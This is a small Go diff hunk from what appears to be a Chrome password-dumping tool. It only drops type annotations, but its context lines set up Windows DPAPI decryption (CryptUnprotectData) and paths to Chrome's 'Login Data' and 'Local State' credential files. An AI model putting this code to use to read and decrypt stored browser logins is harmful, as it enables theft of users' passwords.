@@ -31,8 +31,8 @@ var (
 	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
 	procLocalFree   = dllkernel32.NewProc("LocalFree")
 
-	dataPath       string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
-	localStatePath string = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
+	dataPath       = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
+	localStatePath = os.Getenv("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
 )
 
 type DataBlob struct {
